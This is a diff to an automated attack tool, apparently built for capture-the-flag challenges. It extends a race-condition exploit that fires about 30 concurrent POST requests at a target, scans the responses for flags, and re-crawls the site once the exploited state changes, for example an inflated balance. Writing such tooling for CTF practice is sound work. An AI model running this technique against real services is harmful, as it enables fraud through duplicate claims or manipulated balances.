@@ -2837,8 +2837,8 @@ class AutoPwnPipeline:
             
             def attack(_):
                 try:
-                    r = self.session.post(target_url, data=target_data, timeout=5)
-                    return r.status_code
+                    r = self.session.post(target_url, data=target_data, timeout=5, allow_redirects=True)
+                    return {"status": r.status_code, "text": r.text, "url": r.url}
                 except Exception:
                     return None
                     
@@ -2850,12 +2850,23 @@ class AutoPwnPipeline:
             
             # If multiple requests succeeded (e.g. returned 200 OK or 201 Created), race condition may be present
             # For actions like 'claim', normally only 1 should succeed.
-            success_count = sum(1 for s in valid_results if s in [200, 201])
+            success_count = sum(1 for s in valid_results if s["status"] in [200, 201])
+            
+            # Look for flags in all responses
+            for r in valid_results:
+                if self._check_and_store_flags(r["text"], f"Race Condition Response ({target_url})"):
+                    success = True
+
             if success_count > 1:
                 print_success(f"  [Race Condition] Multiple successes on {target_url}: {success_count}/30 requests returned success codes")
                 self._log_step("Phase 4: Race Condition", f"Potential race on {target_url}", details=f"{success_count} parallel successes")
                 self.narrator.speak_success(f"BOOM! Race Condition verified on {target_url} ({success_count} concurrent successes)")
                 success = True
+                
+                # The state has changed (e.g. balance is now 150 instead of 50). We need to check if the vault/flag is now open!
+                self.narrator.speak_thinking("State changed significantly. Let's do a quick re-crawl to see if the flag is now accessible...")
+                self._deep_crawl_endpoints() # Re-crawl as authenticated user with new state
+                
         return success
 
     def _exploit_web_cache(self):
